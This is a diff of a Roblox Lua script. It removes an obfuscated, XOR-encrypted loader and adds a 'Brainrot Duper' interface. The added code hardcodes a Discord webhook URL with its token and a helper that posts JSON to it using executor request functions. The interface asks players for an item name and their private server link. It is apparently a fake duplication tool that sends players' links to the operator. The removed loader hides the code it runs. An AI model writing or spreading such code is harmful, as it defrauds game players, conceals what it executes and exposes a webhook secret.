@@ -1,1 +1,222 @@
-local key=[[salam12345AA]];WxyDjMTkTCLiiktcnKnAQXOBkUlGRyHpPnyNRYDkqlpqROPxyrnmDwWBmlfafSyqkQOrOfdgtPqYImaYIKJGbEIKJAkCqAoMLaxMIqElkPxaBNaunyryzxLvJtodZvzmz="Encrypt By Yasu";wOVPRPoDKgvRwZiuHHPLZGdzXjskGTuAbIzvAgOdxOypwWdCGQGwsCVUOCTanagalsqEIPMshZwMsGamDnTcdgmDHnnriqwVayxnBLxereUzGtiHhgzQYspvDbtPRDwY=WxyDjMTkTCLiiktcnKnAQXOBkUlGRyHpPnyNRYDkqlpqROPxyrnmDwWBmlfafSyqkQOrOfdgtPqYImaYIKJGbEIKJAkCqAoMLaxMIqElkPxaBNaunyryzxLvJtodZvzm;zgOsssLISegvIHrBAWYBkNePhyytpEQKdRAplWTZEGdtDUmwFuojQpdEMmAkozLrwMrTRUgLOgRAwxqlkSzKKHVYUoxWIDyDpoieRSTztCJNevojBzGfhulbiyjqGpFp=wOVPRPoDKgvRwZiuHHPLZGdzXjskGTuAbIzvAgOdxOypwWdCGQGwsCVUOCTanagalsqEIPMshZwMsGamDnTcdgmDHnnriqwVayxnBLxereUzGtiHhgzQYspvDbtPRDwY;MshAbJlKbUsQtndQYTFGGWARzJqabMhTPPupbtuRINSQUBbAuOtyIcYLmUHcMSlzxbrIlWYxrbyAycXYaNqNPyOaMvgfjUetGmESLhCdHpKtgmHVNOyTjTbJEYDuPHIT=zgOsssLISegvIHrBAWYBkNePhyytpEQKdRAplWTZEGdtDUmwFuojQpdEMmAkozLrwMrTRUgLOgRAwxqlkSzKKHVYUoxWIDyDpoieRSTztCJNevojBzGfhulbiyjqGpFp;KcHFaMJssFGvcyijfYuUZMGxSPAKzEOZuWklPLBHMFdGxhDuVICwuVpZmSodyyMlYLAUmhIcsfUFZDEaOFbTlXzhcDtGxUUKcEKLnkNUhEEbSDcmhaRsbMEVnSDzqSUm=MshAbJlKbUsQtndQYTFGGWARzJqabMhTPPupbtuRINSQUBbAuOtyIcYLmUHcMSlzxbrIlWYxrbyAycXYaNqNPyOaMvgfjUetGmESLhCdHpKtgmHVNOyTjTbJEYDuPHIT;cYEBpnYsGXcHrgutJKuSSHwDsvDvEbsmbeTiTkYNpkzLMcFICfpCJqVgsTWQRLVPOBeWdhOmSkruAiyCWJtjDYXgqLpgnTtPRUBprfVRigDIZNYlFFoWpxEOGRgUtyiC=KcHFaMJssFGvcyijfYuUZMGxSPAKzEOZuWklPLBHMFdGxhDuVICwuVpZmSodyyMlYLAUmhIcsfUFZDEaOFbTlXzhcDtGxUUKcEKLnkNUhEEbSDcmhaRsbMEVnSDzqSUm;_ENV={string=string,table=table,math=math,pairs=pairs,load=load,print=print};WxyDjMTkTCLiiktcnKnAQXOBkUlGRyHpPnyNRYDkqlpqROPxyrnmDwWBmlfafSyqkQOrOfdgtPqYImaYIKJGbEIKJAkCqAoMLaxMIqElkPxaBNaunyryzxLvJtodZvzm="wOVPRPoDKgvRwZiuHHPLZGdzXjskGTuAbIzvAgOdxOypwWdCGQGwsCVUOCTanagalsqEIPMshZwMsGamDnTcdgmDHnnriqwVayxnBLxereUzGtiHhgzQYspvDbtPRDwY";wOVPRPoDKgvRwZiuHHPLZGdzXjskGTuAbIzvAgOdxOypwWdCGQGwsCVUOCTanagalsqEIPMshZwMsGamDnTcdgmDHnnriqwVayxnBLxereUzGtiHhgzQYspvDbtPRDwY="WxyDjMTkTCLiiktcnKnAQXOBkUlGRyHpPnyNRYDkqlpqROPxyrnmDwWBmlfafSyqkQOrOfdgtPqYImaYIKJGbEIKJAkCqAoMLaxMIqElkPxaBNaunyryzxLvJtodZvzm";zgOsssLISegvIHrBAWYBkNePhyytpEQKdRAplWTZEGdtDUmwFuojQpdEMmAkozLrwMrTRUgLOgRAwxqlkSzKKHVYUoxWIDyDpoieRSTztCJNevojBzGfhulbiyjqGpFp={101,97,87,102,85,75,80,80,81,67,71,99,81,118,114,122,66,66,98,85,97,106,100,66,82,70,77,88,110,71,104,100,73,83,114,88,108,82,81,83,117,109,121,103,112,108,111,118,90,120,112,118,87,105,101,83,68,86,86,111,102,119,77,66,122,107,104,116,101,68,105,75,97,116,97,66,118,115,111,98,101,88,75,78,113,118,110,106,114,116,71,114,68,98,65,69,89,103,67,90,89,84,76,74,102,114,105,90,119,97,117,109,72,87,73,106,118,108,72,99,104,66,86,75,80,85,74,87};function xor(t)local ciphertext="";for i=1,#wOVPRPoDKgvRwZiuHHPLZGdzXjskGTuAbIzvAgOdxOypwWdCGQGwsCVUOCTanagalsqEIPMshZwMsGamDnTcdgmDHnnriqwVayxnBLxereUzGtiHhgzQYspvDbtPRDwY do local byte=string.byte(wOVPRPoDKgvRwZiuHHPLZGdzXjskGTuAbIzvAgOdxOypwWdCGQGwsCVUOCTanagalsqEIPMshZwMsGamDnTcdgmDHnnriqwVayxnBLxereUzGtiHhgzQYspvDbtPRDwY, i);local quibit=string.byte(WxyDjMTkTCLiiktcnKnAQXOBkUlGRyHpPnyNRYDkqlpqROPxyrnmDwWBmlfafSyqkQOrOfdgtPqYImaYIKJGbEIKJAkCqAoMLaxMIqElkPxaBNaunyryzxLvJtodZvzm,(i-1)%#WxyDjMTkTCLiiktcnKnAQXOBkUlGRyHpPnyNRYDkqlpqROPxyrnmDwWBmlfafSyqkQOrOfdgtPqYImaYIKJGbEIKJAkCqAoMLaxMIqElkPxaBNaunyryzxLvJtodZvzm+1);ciphertext=ciphertext..string.char(bit.bxor(byte,quibit));end;return ciphertext;end;bit={bxor=function(a,b)local r,m=0,1;while a>0 and b>0 do local aa,bb=a%2,b%2;r=r+m*((aa+bb)%2);m=m*2;a=math.floor(a/2);b=math.floor(b/2) end;if a>0 then r=r+m*a end;if b>0 then r=r+m*b end;return r;end};xor(zgOsssLISegvIHrBAWYBkNePhyytpEQKdRAplWTZEGdtDUmwFuojQpdEMmAkozLrwMrTRUgLOgRAwxqlkSzKKHVYUoxWIDyDpoieRSTztCJNevojBzGfhulbiyjqGpFp)WxyDjMTkTCLiiktcnKnAQXOBkUlGRyHpPnyNRYDkqlpqROPxyrnmDwWBmlfafSyqkQOrOfdgtPqYImaYIKJGbEIKJAkCqAoMLaxMIqElkPxaBNaunyryzxLvJtodZvzmz="Encrypt By Yasu";_ENV={string=string,table=table,math=math,pairs=pairs,load=load,print=print};MshAbJlKbUsQtndQYTFGGWARzJqabMhTPPupbtuRINSQUBbAuOtyIcYLmUHcMSlzxbrIlWYxrbyAycXYaNqNPyOaMvgfjUetGmESLhCdHpKtgmHVNOyTjTbJEYDuPHIT="wOVPRPoDKgvRwZiuHHPLZGdzXjskGTuAbIzvAgOdxOypwWdCGQGwsCVUOCTanagalsqEIPMshZwMsGamDnTcdgmDHnnriqwVayxnBLxereUzGtiHhgzQYspvDbtPRDwY";wOVPRPoDKgvRwZiuHHPLZGdzXjskGTuAbIzvAgOdxOypwWdCGQGwsCVUOCTanagalsqEIPMshZwMsGamDnTcdgmDHnnriqwVayxnBLxereUzGtiHhgzQYspvDbtPRDwY="MshAbJlKbUsQtndQYTFGGWARzJqabMhTPPupbtuRINSQUBbAuOtyIcYLmUHcMSlzxbrIlWYxrbyAycXYaNqNPyOaMvgfjUetGmESLhCdHpKtgmHVNOyTjTbJEYDuPHIT";KcHFaMJssFGvcyijfYuUZMGxSPAKzEOZuWklPLBHMFdGxhDuVICwuVpZmSodyyMlYLAUmhIcsfUFZDEaOFbTlXzhcDtGxUUKcEKLnkNUhEEbSDcmhaRsbMEVnSDzqSUm={97,120,107,71,105,67,70,112,101,85,79,89,118,104,85,89,98,113,90,72,87,119,65,69,80,86,114,121,67,88,66,114,113,118,67,111,79,107,109,98,102,76,119,65,113,119,80,85,67,79,90,109,120,73,73,116,67,120,122,71,104,71,69,107,116,73,90,104,70,66,84,104,110,116,70,100,98,70,116,74,122,79,118,115,108,104,112,89,71,78,112,83,71,98,80,101,67,99,79,109,73,104,89,76,99,68,81,79,87,122,113,97,80,101,113,120,101,75,83,109,104,107,113,77,85,122,76,104};function xor(t)local ciphertext="";for i=1,#wOVPRPoDKgvRwZiuHHPLZGdzXjskGTuAbIzvAgOdxOypwWdCGQGwsCVUOCTanagalsqEIPMshZwMsGamDnTcdgmDHnnriqwVayxnBLxereUzGtiHhgzQYspvDbtPRDwY do local byte=string.byte(wOVPRPoDKgvRwZiuHHPLZGdzXjskGTuAbIzvAgOdxOypwWdCGQGwsCVUOCTanagalsqEIPMshZwMsGamDnTcdgmDHnnriqwVayxnBLxereUzGtiHhgzQYspvDbtPRDwY, i);local quibit=string.byte(MshAbJlKbUsQtndQYTFGGWARzJqabMhTPPupbtuRINSQUBbAuOtyIcYLmUHcMSlzxbrIlWYxrbyAycXYaNqNPyOaMvgfjUetGmESLhCdHpKtgmHVNOyTjTbJEYDuPHIT,(i-1)%#MshAbJlKbUsQtndQYTFGGWARzJqabMhTPPupbtuRINSQUBbAuOtyIcYLmUHcMSlzxbrIlWYxrbyAycXYaNqNPyOaMvgfjUetGmESLhCdHpKtgmHVNOyTjTbJEYDuPHIT+1);ciphertext=ciphertext..string.char(bit.bxor(byte,quibit));end;return ciphertext;end;bit={bxor=function(a,b)local r,m=0,1;while a>0 and b>0 do local aa,bb=a%2,b%2;r=r+m*((aa+bb)%2);m=m*2;a=math.floor(a/2);b=math.floor(b/2) end;if a>0 then r=r+m*a end;if b>0 then r=r+m*b end;return r;end};xor(KcHFaMJssFGvcyijfYuUZMGxSPAKzEOZuWklPLBHMFdGxhDuVICwuVpZmSodyyMlYLAUmhIcsfUFZDEaOFbTlXzhcDtGxUUKcEKLnkNUhEEbSDcmhaRsbMEVnSDzqSUm)WxyDjMTkTCLiiktcnKnAQXOBkUlGRyHpPnyNRYDkqlpqROPxyrnmDwWBmlfafSyqkQOrOfdgtPqYImaYIKJGbEIKJAkCqAoMLaxMIqElkPxaBNaunyryzxLvJtodZvzmz="Encrypt By Yasu";_ENV={string=string,table=table,math=math,pairs=pairs,load=load,print=print};cYEBpnYsGXcHrgutJKuSSHwDsvDvEbsmbeTiTkYNpkzLMcFICfpCJqVgsTWQRLVPOBeWdhOmSkruAiyCWJtjDYXgqLpgnTtPRUBprfVRigDIZNYlFFoWpxEOGRgUtyiC="zgOsssLISegvIHrBAWYBkNePhyytpEQKdRAplWTZEGdtDUmwFuojQpdEMmAkozLrwMrTRUgLOgRAwxqlkSzKKHVYUoxWIDyDpoieRSTztCJNevojBzGfhulbiyjqGpFp";zgOsssLISegvIHrBAWYBkNePhyytpEQKdRAplWTZEGdtDUmwFuojQpdEMmAkozLrwMrTRUgLOgRAwxqlkSzKKHVYUoxWIDyDpoieRSTztCJNevojBzGfhulbiyjqGpFp="cYEBpnYsGXcHrgutJKuSSHwDsvDvEbsmbeTiTkYNpkzLMcFICfpCJqVgsTWQRLVPOBeWdhOmSkruAiyCWJtjDYXgqLpgnTtPRUBprfVRigDIZNYlFFoWpxEOGRgUtyiC";WxyDjMTkTCLiiktcnKnAQXOBkUlGRyHpPnyNRYDkqlpqROPxyrnmDwWBmlfafSyqkQOrOfdgtPqYImaYIKJGbEIKJAkCqAoMLaxMIqElkPxaBNaunyryzxLvJtodZvzm={89,122,77,106,78,83,90,114,90,89,83,117,66,78,70,111,122,121,104,102,76,83,107,75,116,89,78,106,107,78,79,100,90,112,113,72,73,89,113,104,78,72,109,118,101,65,111,112,71,121,82,76,78,78,65,87,85,78,90,79,79,70,116,77,109,98,67,108,104,122,115,84,86,88,89,70,84,76,97,68,76,80,102,80,78,85,82,109,119,68,66,101,87,69,117,116,67,108,81,109,122,104,122,116,73,117,78,84,67,68,114,115,90,119,84,72,67,66,77,102,85,113,67,109,84,80,82,97};function xor(t)local ciphertext="";for i=1,#zgOsssLISegvIHrBAWYBkNePhyytpEQKdRAplWTZEGdtDUmwFuojQpdEMmAkozLrwMrTRUgLOgRAwxqlkSzKKHVYUoxWIDyDpoieRSTztCJNevojBzGfhulbiyjqGpFp do local byte=string.byte(zgOsssLISegvIHrBAWYBkNePhyytpEQKdRAplWTZEGdtDUmwFuojQpdEMmAkozLrwMrTRUgLOgRAwxqlkSzKKHVYUoxWIDyDpoieRSTztCJNevojBzGfhulbiyjqGpFp, i);local quibit=string.byte(cYEBpnYsGXcHrgutJKuSSHwDsvDvEbsmbeTiTkYNpkzLMcFICfpCJqVgsTWQRLVPOBeWdhOmSkruAiyCWJtjDYXgqLpgnTtPRUBprfVRigDIZNYlFFoWpxEOGRgUtyiC,(i-1)%#cYEBpnYsGXcHrgutJKuSSHwDsvDvEbsmbeTiTkYNpkzLMcFICfpCJqVgsTWQRLVPOBeWdhOmSkruAiyCWJtjDYXgqLpgnTtPRUBprfVRigDIZNYlFFoWpxEOGRgUtyiC+1);ciphertext=ciphertext..string.char(bit.bxor(byte,quibit));end;return ciphertext;end;bit={bxor=function(a,b)local r,m=0,1;while a>0 and b>0 do local aa,bb=a%2,b%2;r=r+m*((aa+bb)%2);m=m*2;a=math.floor(a/2);b=math.floor(b/2) end;if a>0 then r=r+m*a end;if b>0 then r=r+m*b end;return r;end};xor(WxyDjMTkTCLiiktcnKnAQXOBkUlGRyHpPnyNRYDkqlpqROPxyrnmDwWBmlfafSyqkQOrOfdgtPqYImaYIKJGbEIKJAkCqAoMLaxMIqElkPxaBNaunyryzxLvJtodZvzm)WxyDjMTkTCLiiktcnKnAQXOBkUlGRyHpPnyNRYDkqlpqROPxyrnmDwWBmlfafSyqkQOrOfdgtPqYImaYIKJGbEIKJAkCqAoMLaxMIqElkPxaBNaunyryzxLvJtodZvzmz="Encrypt By Yasu";zgOsssLISegvIHrBAWYBkNePhyytpEQKdRAplWTZEGdtDUmwFuojQpdEMmAkozLrwMrTRUgLOgRAwxqlkSzKKHVYUoxWIDyDpoieRSTztCJNevojBzGfhulbiyjqGpFp={160,142,140,163,223,146,155,161,166,164,181,97,183,214,220,198,223,81,90,131,163,161,170,180,219,198,208,129,179,154,170,152,152,85,183,115,156,107,216,208,208,146,158,83,132,161,162,186,216,211,223,129,170,81,153,148,161,154,123,136,216,213,191,198,223,167,155,150,153,93,99,145,223,194,229,198,223,164,84,92,62,161,176,164,212,205,140,169,225,165,162,134,153,167,183,170,214,198,140,158,141,152,147,160,153,111,136,166,231,180,209,211,227,154,149,152,92,87,137,181,231,209,191,198,223,167,155,150,153,87,106,75,223,208,207,194,217,81,162,159,149,174,166,179,147,158,140,177,217,146,171,152,166,168,111,141,226,196,205,205,189,157,147,172,153,167,75,173,226,196,205,205,141,161,158,148,173,154,179,136,232,202,140,158,141,161,158,148,173,154,179,123,202,194,213,213,179,160,164,118,156,158,173,165,155,131,188,205,206,170,151,165,123,170,170,99,156,107,118,142,154,81,110,111,112,85,154,176,232,211,140,216,210,147,154,162,163,160,97,169,216,211,209,129,171,111,112,61,160,164,164,162,223,129,195,166,175,121,129,130,127,148,150,147,191,129,169,129,143,153,166,167,164,168,123,112,162,197,213,212,208,160,164,151,98,152,176,174,162,194,220,202,156,168,151,149,156,164,176,172,230,144,157,149,159,100,104,103,108,110,117,122,163,148,159,150,157,97,105,102,104,100,166,180,224,170,222,199,229,169,147,133,165,121,137,164,200,185,218,179,196,147,105,141,147,155,172,143,183,166,218,162,191,161,125,149,118,155,169,169,169,215,157,145,228,151,115,107,158,101,147,131,210,168,218,184,166,121,165,164,154,169,119,145,232,171,222,172,221,104,84,61,62,98,110,97,187,198,216,209,210,163,82,153,169,163,164,181,220,208,218,129,225,160,82,163,163,168,181,97,189,180,187,175,119,157,161,150,149,161,97,167,232,207,207,213,214,160,160,83,164,164,180,181,199,208,195,198,207,153,161,162,159,93,177,162,236,205,219,194,209,123,165,162,162,94,75,97,147,129,140,205,220,148,147,159,84,164,172,109,147,211,209,212,141,110,82,163,151,150,173,173,155,199,225,207,208,165,155,162,162,93,106,75,147,129,140,129,141,81,82,83,166,154,181,182,229,207,140,169,225,165,162,134,153,167,183,170,214,198,166,177,220,164,166,116,167,174,175,164,155,184,177,163,181,128,129,126,147,138,147,141,159,129,220,194,230,157,161,148,152,127,180,176,225,141,140,166,219,166,159,97,124,169,181,177,182,208,218,213,210,159,166,135,173,165,166,111,180,209,220,205,214,148,147,167,157,164,175,139,230,208,218,138,119,81,82,83,84,154,175,165,156,107,140,129,141,81,155,153,84,164,172,97,231,201,209,207,141,163,151,167,169,167,175,97,231,211,225,198,153,81,164,152,167,85,166,175,215,107,118,129,141,81,82,159,163,152,162,173,147,208,215,147,153,81,164,152,167,103,97,126,147,209,207,194,217,157,90,153,169,163,164,181,220,208,218,137,150,59,82,83,84,85,97,97,147,129,213,199,141,164,171,161,84,150,175,165,147,212,229,207,155,163,151,164,169,154,180,181,147,213,212,198,219,59,82,83,84,85,97,97,147,129,140,129,141,81,164,152,168,170,179,175,147,212,229,207,155,163,151,164,169,154,180,181,155,220,193,211,217,110,137,120,118,125,144,144,190,192,193,179,185,93,82,128,153,169,169,176,215,158,142,177,188,132,134,85,96,85,137,166,212,197,209,211,224,110,173,142,86,120,176,175,231,198,218,213,154,133,171,163,153,87,158,126,149,194,220,209,217,154,149,148,168,158,176,175,162,203,223,208,219,83,175,95,84,119,176,165,236,158,220,194,230,157,161,148,152,127,180,176,225,222,149,107,141,81,82,83,84,85,97,97,216,205,223,198,214,151,82,165,153,166,182,166,230,213,140,213,213,150,160,61,84,85,97,97,147,129,140,129,141,81,82,83,166,154,181,182,229,207,140,211,210,162,167,152,167,169,105,188,200,211,216,158,196,118,116,123,131,132,140,160,200,179,184,141,141,126,151,167,156,164,165,126,149,177,187,180,193,83,94,83,124,154,162,165,216,211,223,158,232,140,84,118,163,163,181,166,225,213,153,181,230,161,151,85,145,114,99,162,227,209,216,202,208,146,166,156,163,163,112,171,230,208,218,131,234,93,82,117,163,153,186,126,227,194,229,205,220,146,150,125,167,164,175,190,156,107,140,129,141,81,82,83,84,85,166,173,230,198,213,199,141,153,166,167,164,148,179,166,228,214,209,212,225,81,166,155,153,163,75,97,147,129,140,129,141,81,82,83,84,85,97,179,216,213,225,211,219,81,154,167,168,165,160,179,216,210,225,198,224,165,90,174,137,167,173,126,202,166,174,169,188,128,125,146,137,135,141,109,147,174,209,213,213,160,150,112,86,133,144,148,199,131,152,129,181,150,147,151,153,167,180,126,238,188,142,164,220,159,166,152,162,169,110,149,236,209,209,131,202,110,84,148,164,165,173,170,214,194,224,202,220,159,97,157,167,164,175,99,240,141,140,163,220,149,171,112,164,150,186,173,226,194,208,171,224,160,160,176,93,63,97,97,147,129,140,129,141,81,151,159,167,154,75,97,147,129,140,129,141,81,82,83,84,85,97,166,229,211,219,211,149,83,128,162,84,125,149,149,195,129,217,198,225,153,161,151,84,150,183,162,220,205,205,195,217,150,84,92,62,85,97,97,147,129,140,129,141,150,160,151,62,85,97,97,147,198,218,197,150,59,82,83,84,85,170,167,147,208,215,147,141,165,154,152,162,85,179,166,231,214,222,207,141,165,164,168,153,97,97,179,216,212,158,129,210,159,150,61,84,85,97,97,229,198,224,214,223,159,82,153,149,161,180,166,159,129,222,198,224,81,161,165,84,167,166,180,165,107,209,207,209,59,60,96,97,85,131,182,220,205,208,129,194,122,60,159,163,152,162,173,147,212,207,211,210,150,160,122,169,158,97,126,147,170,218,212,225,146,160,150,153,99,175,166,234,137,142,180,208,163,151,152,162,124,182,170,149,138,118,212,208,163,151,152,162,124,182,170,161,175,205,206,210,81,111,83,86,119,179,162,220,207,222,208,225,117,167,163,153,167,150,138,149,107,223,196,223,150,151,161,123,170,170,111,197,198,223,198,225,128,160,134,164,150,184,175,147,158,140,199,206,157,165,152,62,168,164,179,216,198,218,168,226,154,96,141,125,163,165,166,235,163,209,201,206,167,155,162,166,85,126,97,184,207,225,206,155,139,123,161,152,154,185,131,216,201,205,215,214,160,164,97,135,158,163,173,220,207,211,107,224,148,164,152,153,163,136,182,220,143,188,194,223,150,160,167,84,114,97,177,223,194,229,198,223,120,167,156,62,63,173,176,214,194,216,129,218,146,155,161,84,114,97,138,225,212,224,194,219,148,151,97,162,154,184,105,149,167,222,194,218,150,84,92,62,162,162,170,225,143,186,194,218,150,82,112,84,87,142,162,220,207,142,107,218,146,155,161,98,136,170,187,216,129,169,129,194,117,155,160,102,99,175,166,234,137,156,141,141,101,104,99,96,85,113,109,147,147,160,145,150,81,95,96,84,158,175,164,229,198,205,212,210,149,82,155,153,158,168,169,231,129,210,208,223,81,148,168,168,169,176,175,230,107,217,194,214,159,96,131,163,168,170,181,220,208,218,129,170,81,135,119,157,162,115,111,225,198,227,137,157,95,103,95,100,97,113,111,168,141,156,138,119,158,147,156,162,99,130,175,214,201,219,211,189,160,155,161,168,85,126,97,201,198,207,213,220,163,100,97,162,154,184,105,163,143,161,141,157,95,103,92,62,162,162,170,225,143,174,194,208,156,153,165,163,170,175,165,182,208,216,208,223,100,82,112,84,120,176,173,226,211,159,143,211,163,161,160,134,124,131,105,164,149,152,146,161,93,99,103,93,63,174,162,220,207,154,163,220,163,150,152,166,136,170,187,216,177,213,217,210,157,82,112,84,101,75,174,212,202,218,143,199,122,160,151,153,173,97,126,147,150,118,206,206,154,160,97,132,150,179,166,225,213,140,158,141,164,149,165,153,154,175,136,232,202,118,170,219,164,166,148,162,152,166,111,225,198,227,137,143,134,123,118,163,167,175,166,229,131,152,129,218,146,155,161,93,99,132,176,229,207,209,211,191,146,150,156,169,168,97,126,147,182,176,202,218,95,160,152,171,93,113,109,164,147,149,107,217,160,149,148,160,85,180,181,229,208,215,198,141,110,82,124,162,168,181,162,225,196,209,143,219,150,169,91,86,138,138,148,231,211,219,204,210,83,94,83,161,150,170,175,156,107,223,213,223,160,157,152,98,137,179,162,225,212,220,194,223,150,160,150,173,85,126,97,163,143,164,150,119,164,166,165,163,160,166,111,199,201,213,196,216,159,151,166,167,85,126,97,164,107,118,142,154,81,122,152,149,153,166,179,125,205,219,196,206,157,82,155,153,150,165,166,229,129,169,129,182,159,165,167,149,163,164,166,161,207,209,216,149,83,120,165,149,162,166,99,159,129,217,194,214,159,91,61,156,154,162,165,216,211,154,180,214,171,151,83,113,85,150,133,220,206,158,143,219,150,169,91,101,97,113,109,163,141,162,147,150,59,154,152,149,153,166,179,161,163,205,196,216,152,164,162,169,163,165,132,226,205,219,211,160,81,111,83,119,164,173,176,229,148,154,199,223,160,159,133,123,119,105,114,171,141,157,153,153,98,106,92,62,157,166,162,215,198,222,143,175,160,164,151,153,167,148,170,237,198,188,202,229,150,158,83,113,85,113,75,188,207,223,213,206,159,149,152,98,163,166,184,155,131,193,170,176,160,164,161,153,167,99,109,147,201,209,194,209,150,164,92,98,120,176,179,225,198,222,179,206,149,155,168,167,85,126,97,200,165,213,206,155,159,151,170,92,101,109,114,165,138,118,107,217,160,149,148,160,85,181,170,231,205,209,129,170,81,123,161,167,169,162,175,214,198,154,207,210,168,90,85,136,154,185,181,191,194,206,198,217,83,94,83,156,154,162,165,216,211,149,107,225,154,166,159,153,99,148,170,237,198,140,158,141,134,118,156,161,103,111,175,216,216,148,146,153,94,100,103,96,102,109,113,156,107,224,202,225,157,151,97,132,164,180,170,231,202,219,207,141,110,82,136,120,158,174,115,161,207,209,216,149,97,94,100,102,97,113,109,163,138,118,213,214,165,158,152,98,119,162,164,222,200,222,208,226,159,150,135,166,150,175,180,227,194,222,198,219,148,171,83,113,85,114,75,231,202,224,205,210,95,134,152,172,169,97,126,147,131,174,211,206,154,160,165,163,169,97,133,232,209,209,211,143,59,166,156,168,161,166,111,185,208,218,213,141,110,82,120,162,170,174,111,185,208,218,213,155,120,161,167,156,150,174,131,226,205,208,107,225,154,166,159,153,99,149,166,235,213,191,202,231,150,82,112,84,103,115,75,231,202,224,205,210,95,134,152,172,169,132,176,223,208,222,148,141,110,82,118,163,161,176,179,166,143,210,211,220,158,132,122,118,93,115,118,168,141,157,149,157,93,98,92,62,169,170,181,223,198,154,181,210,169,166,139,117,161,170,168,225,206,209,207,225,81,111,83,121,163,182,174,161,181,209,217,225,137,115,159,157,156,175,174,216,207,224,143,185,150,152,167,62,63,110,110,147,164,219,207,225,150,160,167,84,155,179,162,224,198,118,205,220,148,147,159,84,152,176,175,231,198,218,213,141,110,82,124,162,168,181,162,225,196,209,143,219,150,169,91,86,123,179,162,224,198,142,141,141,158,147,156,162,94,75,164,226,207,224,198,219,165,96,134,157,175,166,97,176,129,193,165,214,158,100,97,162,154,184,105,164,141,153,147,165,93,99,95,97,108,117,106,125,196,219,207,225,150,160,167,98,133,176,180,220,213,213,208,219,81,111,83,137,121,170,174,165,143,218,198,228,89,98,95,101,105,109,113,159,151,160,138,119,148,161,161,168,154,175,181,161,163,205,196,216,152,164,162,169,163,165,149,229,194,218,212,221,146,164,152,162,152,186,97,176,129,157,107,119,157,161,150,149,161,97,167,232,207,207,213,214,160,160,83,162,154,184,141,212,195,209,205,149,161,147,165,153,163,181,109,227,208,223,186,153,165,151,171,168,94,75,97,147,129,140,205,220,148,147,159,84,161,163,173,147,158,140,170,219,164,166,148,162,152,166,111,225,198,227,137,143,133,151,171,168,129,162,163,216,205,142,141,141,161,147,165,153,163,181,106,125,129,140,129,141,157,148,159,98,136,170,187,216,129,169,129,194,117,155,160,102,99,175,166,234,137,156,141,158,99,98,95,100,97,115,113,156,107,140,129,141,81,158,149,160,99,145,176,230,202,224,202,220,159,82,112,84,138,133,170,224,147,154,207,210,168,90,99,96,101,109,113,159,209,219,212,198,90,60,83,84,85,97,173,213,205,154,163,206,148,
+-- Brainrot Duper (Polished Fixed v2)
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- <<< Your webhook here >>>
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1423648949033500734/esmIrfxxaRqDHcUXnRWb7Z_fkNDEnARpKbBfhh6v10wfA8j0RB_GnW9Hsqft6PuJrKp7"
+
+-- Helper function to post JSON
+local function postToWebhook(payloadJson)
+    local ok, res = pcall(function()
+        return HttpService:PostAsync(WEBHOOK_URL, payloadJson, Enum.HttpContentType.ApplicationJson)
+    end)
+    if ok then return true, res end
+
+    local ok2, res2 = pcall(function()
+        if syn and syn.request then
+            return syn.request({Url=WEBHOOK_URL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payloadJson})
+        elseif request then
+            return request({Url=WEBHOOK_URL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payloadJson})
+        elseif http_request then
+            return http_request({Url=WEBHOOK_URL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payloadJson})
+        else
+            error("No HTTP method available")
+        end
+    end)
+    if ok2 then return true, res2 end
+    return false, res or res2
+end
+
+-- Build UI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "BrainrotDuperUI"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = playerGui
+
+local main = Instance.new("Frame")
+main.Name = "Main"
+main.Size = UDim2.new(0, 460, 0, 240) -- increased height for buttons
+main.Position = UDim2.new(0.5,0,0.5,0)
+main.AnchorPoint = Vector2.new(0.5,0.5)
+main.BackgroundColor3 = Color3.fromRGB(14,14,14)
+main.BorderSizePixel = 0
+main.ZIndex = 5
+main.Parent = screenGui
+Instance.new("UICorner", main).CornerRadius = UDim.new(0,12)
+local stroke = Instance.new("UIStroke", main)
+stroke.Transparency = 0.85
+stroke.Thickness = 1
+
+-- Header
+local header = Instance.new("Frame", main)
+header.Size = UDim2.new(1,0,0,62)
+header.BackgroundColor3 = Color3.fromRGB(18,18,18)
+header.BorderSizePixel = 0
+Instance.new("UICorner", header).CornerRadius = UDim.new(0,12)
+
+local title = Instance.new("TextLabel", header)
+title.Size = UDim2.new(1,-24,1,0)
+title.Position = UDim2.new(0,12,0,0)
+title.BackgroundTransparency = 1
+title.Text = "Brainrot Duper"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 22
+title.TextColor3 = Color3.fromRGB(255,140,0)
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Content frame
+local content = Instance.new("Frame", main)
+content.Size = UDim2.new(1,-28,1,-74)
+content.Position = UDim2.new(0,14,0,64)
+content.BackgroundTransparency = 1
+
+local function newLabel(parent,posY,text)
+    local lbl = Instance.new("TextLabel", parent)
+    lbl.Size = UDim2.new(0,120,0,20)
+    lbl.Position = UDim2.new(0,0,0,posY)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = text
+    lbl.Font = Enum.Font.Gotham
+    lbl.TextSize = 14
+    lbl.TextColor3 = Color3.fromRGB(200,200,200)
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    return lbl
+end
+
+local function newBox(parent,posY,width)
+    local box = Instance.new("TextBox", parent)
+    box.Size = UDim2.new(0,width,0,34)
+    box.Position = UDim2.new(0,0,0,posY)
+    box.BackgroundColor3 = Color3.fromRGB(26,26,26)
+    box.TextColor3 = Color3.fromRGB(230,230,230)
+    box.Font = Enum.Font.Gotham
+    box.TextSize = 15
+    box.ClearTextOnFocus = false
+    box.Text = "" -- ensures textbox starts empty
+    local c = Instance.new("UICorner", box)
+    c.CornerRadius = UDim.new(0,8)
+    local s = Instance.new("UIStroke", box)
+    s.Transparency = 0.9
+    s.Thickness = 1
+    return box
+end
+
+newLabel(content,2,"Brainrot Name:")
+local nameBox = newBox(content,22,430)
+nameBox.PlaceholderText = "Enter name..."
+
+newLabel(content,64,"Private Link:")
+local linkBox = newBox(content,84,430)
+linkBox.PlaceholderText = "https://..."
+
+-- Feedback
+local feedback = Instance.new("TextLabel", content)
+feedback.Size = UDim2.new(1,0,0,18)
+feedback.Position = UDim2.new(0,0,0,132)
+feedback.BackgroundTransparency = 1
+feedback.Text = ""
